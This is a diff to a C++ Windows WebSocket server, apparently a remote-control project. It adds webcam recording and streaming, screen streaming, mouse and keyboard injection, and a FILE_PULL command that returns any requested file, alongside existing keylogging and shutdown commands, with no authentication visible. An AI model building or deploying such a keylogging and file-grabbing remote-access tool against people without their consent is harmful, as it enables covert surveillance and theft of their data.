@@ -4,13 +4,18 @@
 #include <fstream>
 #include <sstream>
 #include <iomanip>
-#include <bcrypt.h> // Cần cho SHA-1
-#include <cstdio>   // Cần cho remove()
+#include <bcrypt.h> 
+#include <cstdio>   
 #include "TaskManager.h"
 #include "AppManager.h"
 #include "SystemControl.h"
+#include "InputManager.h"
+#include <atomic>
 
-// +++ HÀM BASE64 TỰ VIẾT MỚI (SỬA LỖI HANDSHAKE) +++
+static std::atomic<bool> g_cameraRunning(false);
+static std::atomic<bool> g_screenRunning(false);
+
+
 static std::string base64_encode_manual(const BYTE* data, size_t len) {
     static const std::string base64_chars =
         "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
@@ -41,7 +46,6 @@ static std::string base64_encode_manual(const BYTE* data, size_t len) {
     }
     return ret;
 }
-// +++ KẾT THÚC HÀM MỚI +++
 
 
 WebSocketServer::WebSocketServer(const std::string& ip, int port)
@@ -52,7 +56,7 @@ WebSocketServer::WebSocketServer(const std::string& ip, int port)
 WebSocketServer::~WebSocketServer() {
     if (server_socket != INVALID_SOCKET) closesocket(server_socket);
     WSACleanup();
-    std::cout << "Server da tat." << std::endl;
+    std::cout << "SERVER TURNED OFF!" << std::endl;
 }
 
 
@@ -60,8 +64,8 @@ bool WebSocketServer::Start(std::atomic<bool>& isRunning) {
     // 1. Tạo Socket
     server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (server_socket == INVALID_SOCKET) {
-        std::cerr << "Loi tao socket: " << WSAGetLastError() << "\n";
-        return false; // KHÔNG gọi WSACleanup() ở đây
+        std::cerr << "ERROR CREATING SOCKET: " << WSAGetLastError() << "\n";
+        return false; 
     }
 
     // 2. Cấu hình địa chỉ
@@ -69,7 +73,7 @@ bool WebSocketServer::Start(std::atomic<bool>& isRunning) {
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(server_port);
 
-    // Xử lý IP "0.0.0.0" chuẩn xác
+    // Xử lý IP "0.0.0.0"
     if (server_ip == "0.0.0.0") {
         serverAddr.sin_addr.s_addr = INADDR_ANY;
     }
@@ -79,16 +83,16 @@ bool WebSocketServer::Start(std::atomic<bool>& isRunning) {
 
     // 3. Bind & Listen
     if (bind(server_socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        std::cerr << "Loi bind: " << WSAGetLastError() << "\n";
+        std::cerr << "BINDING ERROR " << WSAGetLastError() << "\n";
         Close(); return false;
     }
 
     if (listen(server_socket, SOMAXCONN) == SOCKET_ERROR) {
-        std::cerr << "Loi listen: " << WSAGetLastError() << "\n";
+        std::cerr << "LISTENING ERROR: " << WSAGetLastError() << "\n";
         Close(); return false;
     }
 
-    std::cout << "✅ Server lang nghe tai port " << server_port << "...\n";
+    std::cout << "SERVER LISTENING AT PORT " << server_port << "...\n";
 
     // 4. VÒNG LẶP CHÍNH (NON-BLOCKING)
     while (isRunning) {
@@ -101,19 +105,14 @@ bool WebSocketServer::Start(std::atomic<bool>& isRunning) {
         timeout.tv_sec = 1;
         timeout.tv_usec = 0;
 
-        // Hàm select sẽ chờ tối đa 1 giây
-        // - Nếu có client kết nối -> trả về > 0
-        // - Nếu hết 1 giây không ai gọi -> trả về 0 -> Vòng lặp chạy tiếp kiểm tra isRunning
-        // - Nếu lỗi -> trả về < 0
         int activity = select(0, &readfds, NULL, NULL, &timeout);
 
         if (activity < 0) {
-            std::cerr << "Loi select(). Server dung.\n";
+            std::cerr << "SELECTING ERROR: SERVER STOPPED\n";
             break;
         }
 
         if (activity == 0) {
-            // Timeout: Không có ai kết nối cả, quay lại đầu vòng lặp check isRunning
             continue;
         }
 
@@ -124,25 +123,23 @@ bool WebSocketServer::Start(std::atomic<bool>& isRunning) {
             SOCKET clientSocket = accept(server_socket, (sockaddr*)&clientAddr, &clientLen);
 
             if (clientSocket != INVALID_SOCKET) {
-                std::cout << "🔗 Client moi ket noi!\n";
+                std::cout << "🔗 NEW CLIENT!\n";
                 // Detach thread để xử lý riêng client này
                 std::thread(&WebSocketServer::handle_client, this, clientSocket).detach();
             }
         }
     }
-
-    std::cout << "Server da dung vong lap.\n";
     Close(); // Đóng socket khi thoát
     return true;
 }
 
 void WebSocketServer::handle_client(SOCKET client_socket) {
     if (!perform_handshake(client_socket)) {
-        std::cerr << "-> Handshake that bai hoac Client ngat ket noi som." << std::endl;
+        std::cerr << "-> FAILED TO HANDSHAKE OR CLIENT DISCONNECTED" << std::endl;
         closesocket(client_socket);
         return;
     }
-    std::cout << "-> Client da ket noi (Handshake OK)." << std::endl;
+    std::cout << "-> CLIENT CONNECTED" << std::endl;
 
     std::vector<char> frame_buffer;
     std::string payload_data;
@@ -167,12 +164,12 @@ void WebSocketServer::handle_client(SOCKET client_socket) {
         case WebSocketFrameType::ERROR_FRAME:
         case WebSocketFrameType::INCOMPLETE:
         default:
-            std::cerr << "-> Nhan duoc frame loi / khong ho tro. Dong ket noi." << std::endl;
+            std::cerr << "-> GOT ERROR FRAME, CLOSE CONNECTION" << std::endl;
             goto close_connection;
         }
     }
     close_connection:
-        std::cout << "-> Client da ngat ket noi." << std::endl;
+        std::cout << "-> CLIENT DISCONNECTED" << std::endl;
         closesocket(client_socket);
 }
 
@@ -186,11 +183,17 @@ void WebSocketServer::process_command(SOCKET client_socket, const std::string& c
         if (m_streamEngine.GetScreenShot(jpgData)) SendImage(client_socket, jpgData);
     }
 
-    else if (cmd.find("CMD_OPEN_SCREEN") != std::string::npos) {
-        std::cout << "-> Lenh: START SCREEN STREAM" << std::endl;
+    else if (cmd == "CMD_OPEN_SCREEN") {
+        if (g_cameraRunning) {
+            send_data(client_socket, "ERROR:CAMERA_RUNNING", false);
+            return;
+        }
 
-        // Đảm bảo tắt Camera trước khi bật Screen (để tránh xung đột luồng gửi ảnh)
-        m_streamEngine.StopCameraStream();
+        std::cout << "-> COMMAND: START SCREEN STREAM" << std::endl;
+
+        g_screenRunning = true;
+
+        send_data(client_socket, "SCREEN_READY", false);
 
         m_streamEngine.StartScreenStream(
             [this, client_socket](const std::vector<uchar>& frameBuffer) -> bool {
@@ -200,27 +203,69 @@ void WebSocketServer::process_command(SOCKET client_socket, const std::string& c
     }
 
 
-    else if (cmd.find("CMD_CLOSE_SCREEN") != std::string::npos) {
-        std::cout << "-> Lenh: STOP SCREEN STREAM" << std::endl;
+    else if (cmd == "CMD_CLOSE_SCREEN") {
         m_streamEngine.StopScreenStream();
+        g_screenRunning = false;
+        send_data(client_socket, "SCREEN_CLOSED", false);
     }
 
 
-    else if (cmd.find("CMD_OPEN_CAM") != std::string::npos) {
-        m_streamEngine.StopScreenStream(); // Tắt Screen nếu bật Cam
-        m_streamEngine.StartCameraStream(0, [this, client_socket](const std::vector<uchar>& frame) {
-            return this->SendImage(client_socket, frame);
-            });
+
+    else if (cmd == "CMD_OPEN_CAM") {
+
+        if (g_screenRunning) {
+            send_data(client_socket, "ERROR:SCREEN_RUNNING", false);
+            return;
+        }
+
+        if (g_cameraRunning) {
+            send_data(client_socket, "CAM_READY", false);
+            return;
+        }
+
+        std::cout << "-> COMMAND: OPEN CAMERA" << std::endl;
+
+        bool started = m_streamEngine.StartCameraStream(
+            0,
+            [this, client_socket](const std::vector<uchar>& frame) {
+                return this->SendImage(client_socket, frame);
+            }
+        );
+
+        if (!started) {
+            send_data(client_socket, "CAM_FAILED", false);
+            return;
+        }
+
+        g_cameraRunning = true;
+        send_data(client_socket, "CAM_READY", false);
     }
 
 
-    else if (cmd.find("CMD_CLOSE_CAM") != std::string::npos) {
+    else if (cmd == "CMD_CLOSE_CAM") {
         m_streamEngine.StopCameraStream();
+        g_cameraRunning = false;
+        send_data(client_socket, "CAM_CLOSED", false);
     }
+
+    else if (cmd == "CAM_REC_START") {
+        std::string fileName = "Cam_Rec_" + std::to_string(time(0)) + ".avi";
+
+        if (m_streamEngine.StartCamRecording(fileName, 25)) {
+            // Gửi lệnh thông báo tên file về cho Web
+            send_data(client_socket, "FILENAME:" + fileName, false);
+            send_data(client_socket, "LOG: Webcam recording started", false);
+        }
+    }
+    else if (cmd == "CAM_REC_STOP") {
+        m_streamEngine.StopCamRecording();
+        send_data(client_socket, "LOG: Webcam recording stopped", false);
+    }
+
 
     // --- PHẦN 2: PROCESSES (Dữ liệu động Real-time) ---
     else if (cmd == "TASK_LIST") {
-        std::cout << "-> Lenh: TASK_LIST (Processes)" << std::endl;
+        std::cout << "-> COMMAND: TASK_LIST (Processes)" << std::endl;
         // Gọi TaskManager cũ để lấy JSON
         std::string json = TaskManager::GetProcessList();
         send_data(client_socket, json, false);
@@ -239,7 +284,7 @@ void WebSocketServer::process_command(SOCKET client_socket, const std::string& c
 
     // --- PHẦN 3: APPLICATIONS (Dữ liệu tĩnh Installed Apps) --- [MỚI TÍCH HỢP]
     else if (cmd == "APP_LIST") {
-        std::cout << "-> Lenh: APP_LIST (Installed Apps)" << std::endl;
+        std::cout << "-> COMMAND: APP_LIST (Installed Apps)" << std::endl;
         // Gọi AppManager để lấy JSON danh sách cài đặt
         std::string json = AppManager::GetAppListJSON();
         send_data(client_socket, json, false);
@@ -247,7 +292,7 @@ void WebSocketServer::process_command(SOCKET client_socket, const std::string& c
     else if (cmd.find("APP_START") == 0) {
         // Format: APP_START C:\Program Files\Google\Chrome\chrome.exe
         std::string path = cmd.substr(10);
-        std::cout << "-> Lenh: APP_START " << path << std::endl;
+        std::cout << "-> COMMAND: APP_START " << path << std::endl;
 
         DWORD newPid = AppManager::StartApp(path);
         if (newPid > 0)
@@ -268,10 +313,74 @@ void WebSocketServer::process_command(SOCKET client_socket, const std::string& c
         catch (...) {}
     }
 
+
+    else if (cmd.find("FILE_PULL ") == 0) {
+        std::string filePath = cmd.substr(10); // Lấy tên file từ lệnh "FILE_PULL name.avi"
+        std::ifstream file(filePath, std::ios::binary);
+
+        if (file.is_open()) {
+            // Đọc toàn bộ file vào vector
+            std::vector<BYTE> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+            file.close();
+
+            // Chuyển sang Base64 (dùng hàm base64_encode_manual bạn đã có)
+            std::string encodedContent = base64_encode_manual(buffer.data(), buffer.size());
+
+            // Tạo JSON giả lập để Flask/JS dễ xử lý
+            // Cấu trúc: {"file_name": "abc.avi", "file_content": "base64..."}
+            std::string jsonResponse = "{\"file_name\":\"" + filePath + "\", \"file_content\":\"" + encodedContent + "\"}";
+
+            send_data(client_socket, jsonResponse, false);
+            std::cout << "[FILE] Da gui file: " << filePath << std::endl;
+        }
+        else {
+            send_data(client_socket, "{\"file_content\":\"ERROR\"}", false);
+        }
+}
+
+    // --- PHẦN 4: REMOTE CONTROL (TeamViewer Style) --- [MỚI]
+
+    // 1. Di chuyển chuột: "MOUSE_MOVE x y" (Ví dụ: MOUSE_MOVE 500 300)
+    if (cmd.find("MOUSE_MOVE") == 0) {
+        int x, y;
+        if (sscanf_s(cmd.c_str(), "MOUSE_MOVE %d %d", &x, &y) == 2) {
+            InputManager::MoveMouse(x, y);
+        }
+    }
+
+    // 2. Click chuột: "MOUSE_CLICK type state" 
+    // type: 0(Left), 1(Right)
+    // state: 1(Down), 0(Up) -> Client phải gửi event Down riêng và Up riêng để hỗ trợ Drag & Drop
+    else if (cmd.find("MOUSE_CLICK") == 0) {
+        int type, state;
+        if (sscanf_s(cmd.c_str(), "MOUSE_CLICK %d %d", &type, &state) == 2) {
+            InputManager::MouseButton(type, state == 1);
+        }
+    }
+
+    // 3. Cuộn chuột: "MOUSE_SCROLL delta"
+    else if (cmd.find("MOUSE_SCROLL") == 0) {
+        int delta;
+        if (sscanf_s(cmd.c_str(), "MOUSE_SCROLL %d", &delta) == 1) {
+            InputManager::MouseScroll(delta);
+        }
+    }
+
+    // 4. Bàn phím: "KEY_EVENT vkCode state"
+    // vkCode: Mã phím Windows (Ví dụ: 65 là 'A', 13 là Enter)
+    // state: 1(Down), 0(Up)
+
+    else if (cmd.find("KEY_EVENT") == 0) {
+        int vkCode, state;
+        if (sscanf_s(cmd.c_str(), "KEY_EVENT %d %d", &vkCode, &state) == 2) {
+            InputManager::KeyEvent(vkCode, state == 1);
+        }
+    }
+
     // --- PHẦN KHÁC (KEYLOGGING, SHUTDOWN, RESTART) ---
     if (cmd == "KEYLOGGING_ON") {
         if (!m_keylogger.isRunning) {
-            std::cout << "-> Lenh: START KEYLOGGING" << std::endl;
+            std::cout << "-> COMMAND: START KEYLOGGING" << std::endl;
             m_keylogger.Start();
 
             // Tạo luồng riêng để gửi dữ liệu về, detach để nó tự chạy ngầm
@@ -283,7 +392,7 @@ void WebSocketServer::process_command(SOCKET client_socket, const std::string& c
 
     else if (cmd == "KEYLOGGING_OFF") {
         if (m_keylogger.isRunning) {
-            std::cout << "-> Lenh: STOP KEYLOGGING" << std::endl;
+            std::cout << "-> COMMAND: STOP KEYLOGGING" << std::endl;
             m_keylogger.Stop(); // Khi Stop, biến isRunning = false -> Vòng lặp KeyLogSender sẽ tự thoát
             send_data(client_socket, "Keylogger Stopped", false);
         }
@@ -291,28 +400,28 @@ void WebSocketServer::process_command(SOCKET client_socket, const std::string& c
 
     else if (cmd == "CMD_SHUTDOWN") {
         if (SystemControl::Shutdown()) {
-            send_data(client_socket, "Dang tat may...", false);
+            send_data(client_socket, "SHUTTING DOWN", false);
         }
         else {
-            send_data(client_socket, "Loi: Can quyen Admin de tat may.", false);
+            send_data(client_socket, "ERROR: NEED ADMINISTRATION PRIVILAGE", false);
         }
     }
 
     else if (cmd == "CMD_RESTART") {
-        std::cout << "-> Lenh: RESTART PC" << std::endl;
+        std::cout << "-> COMMAND: RESTART PC" << std::endl;
         if (SystemControl::Restart()) {
-            send_data(client_socket, "Dang khoi dong lai...", false);
+            send_data(client_socket, "RESTARTING...", false);
         }
         else {
-            send_data(client_socket, "Loi: Khong the restart (Can quyen Admin)", false);
+            send_data(client_socket, "ERROR: NEED ADMINISTRATION PRIVILAGE", false);
         }
     }
 
 
     else if (cmd == "CMD_LOCK") {
-        std::cout << "-> Lenh: LOCK PC" << std::endl;
+        std::cout << "-> COMMAND: LOCK PC" << std::endl;
         if (SystemControl::Lock()) {
-            send_data(client_socket, "Da khoa man hinh", false);
+            send_data(client_socket, "LOCKED", false);
         }
     }
 }
@@ -503,7 +612,7 @@ bool WebSocketServer::SendImage(SOCKET clientSocket, const std::vector<uchar>& b
         int bytes_sent = send(clientSocket, raw_data + total_sent, (int)(data_len - total_sent), 0);
 
         if (bytes_sent == SOCKET_ERROR) {
-            std::cerr << "Loi gui Payload WebSocket: " << WSAGetLastError() << std::endl;
+            std::cerr << "Error sending Payload WebSocket: " << WSAGetLastError() << std::endl;
             return false;
         }
         total_sent += bytes_sent;
